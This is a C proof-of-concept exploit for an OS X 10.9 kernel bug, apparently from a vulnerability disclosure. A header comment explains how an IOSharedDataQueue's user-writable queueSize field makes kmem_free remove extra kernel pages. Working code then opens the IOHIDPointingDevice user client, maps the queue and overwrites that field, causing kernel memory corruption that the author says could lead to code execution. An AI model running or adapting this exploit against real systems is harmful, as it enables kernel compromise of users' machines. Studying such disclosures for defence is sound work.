/*
clang -o hidlib_bad_kmem_free hidlib_bad_kmem_free.c -framework IOKit

IOSharedDataQueue is used by OS X kernel drivers to implement a user/kernel queue in shared memory.

The memory which is mapped into userspace is represented by the variable-sized struct IODataQueueMemory:

typedef struct _IODataQueueMemory {
      UInt32 queueSize;
      volatile UInt32 head;
      volatile UInt32 tail;
      IODataQueueEntry queue[1];
} IODataQueueMemory;

This is allocated on the kernel heap with IOMallocAligned (the size is rounded up to the nearest page multiple.)
This size is stored in the queueSize field.

Kernel code can call IOSharedDataQueue::getMemoryDescriptor to wrap these pages in an IOMemoryDescriptor
which can then be mapped into the userspace task (via IOConnectMapMemory.)

When the IOSharedDataQueue is destructed its ::free method passes the queueSize to kmem_free, which simply removes
the corresponding number of pages from the kernel_map. If userspace increased the value of the queueSize field
this will remove more pages than were allocated - potentially removing other live allocations from the map.

This could be leveraged for code execution by, for example, forcing these free pages to be reallocated with controlled
data before they are accessed.

[[ Note that due to the nature of this bug this PoC will crash in weird ways - break at IODataQueue::free to see the bad size]]

tested on: MacBookAir5,2 w/ 10.9.3/13d64
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDPointingDevice");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 0);
  }
  
  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

    
  inputScalar[0] = 0x0;   // flags
  inputScalar[1] = 0x100; // depth
  inputScalarCnt = 2;
  outputScalarCnt = 1;


  // create a queue
  err = IOConnectCallMethod(
    conn,
    0x3, // create_queue
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err != KERN_SUCCESS){
    printf("IOConnectCall error: %x\n", err);
    return 0;
  }

  uint32_t qid = outputScalar[0];
  printf("created queue id: 0x%x\n", qid);
  
  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  // map the IODataQueue into userspace:  
  err = IOConnectMapMemory(conn, qid, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);
  
  // overwrite the queueSize field:
  buf[0] = 0xfffff0;

  printf("noch einen Augenblick...\n");

  return 0;
}
